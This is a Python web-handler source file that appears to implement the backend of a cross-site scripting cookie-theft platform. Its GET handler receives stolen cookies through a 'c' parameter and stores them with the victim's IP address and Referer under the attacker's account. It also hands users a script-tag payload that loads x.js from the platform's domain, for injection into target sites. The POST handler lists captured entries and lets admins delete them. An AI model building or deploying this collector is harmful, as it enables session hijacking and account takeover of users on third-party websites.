# coding:utf-8

from view import route, View
from model.board import Board
from model.user import User
import config


@route('/x', name='xss')
class BoardView(View):
    def get(self):
        user = self.current_user()
        if user:
            words_query = Board.get_all(username=user.username)
        else:
            words_query = []
        _token = user.key if user else None
        token = self.get_argument('token', '')
        if not user and token:
            user = User.get_by_key(token)
        if not user:
            return self.finish()
        cookie = self.get_argument('c', '')
        IP = self.request.remote_ip
        if cookie != '' and user:
            referer = self.request.headers.get('Referer')
            if not referer:
                referer = 'http://127.0.0.1'
            Board.new(user.username, cookie, IP, referer)
            self.write('ok')
            return self.finish()
        if _token:
            port = ""
            if config.PORT != 80:
                port = ":" + str(config.PORT)
            self.messages.success(
                '&ltscript src="{domain}{port}/static/js/x.js"&gt&lt/script&gt'.format(domain=config.DOMAIN, port=port))
        self.render(
            'xss.html',
            words_query=words_query,
            find_words_query=''  # 此处不赋值为空，将报错未定义变量
        )

    def post(self):
        self.prepare()
        dele_by_id = self.get_argument('dele_by_id', '')
        words_query = Board.get_all(self.current_user().username)
        find_words_query = []
        IP = self.request.remote_ip
        user = self.current_user()

        if dele_by_id:
            if user.is_admin():  # 如果不是admin用户将无法删除
                Board.dele_by_id(dele_by_id)
                self.messages.success("删除成功！")
            else:
                self.messages.error("您没有删除权限！")
            return self.redirect('x')  # 此处是为了防止F5刷新导致提交第二次的删除操作

        self.render(
            'board.html',
            words_query=words_query,
            find_words_query=find_words_query,
        )
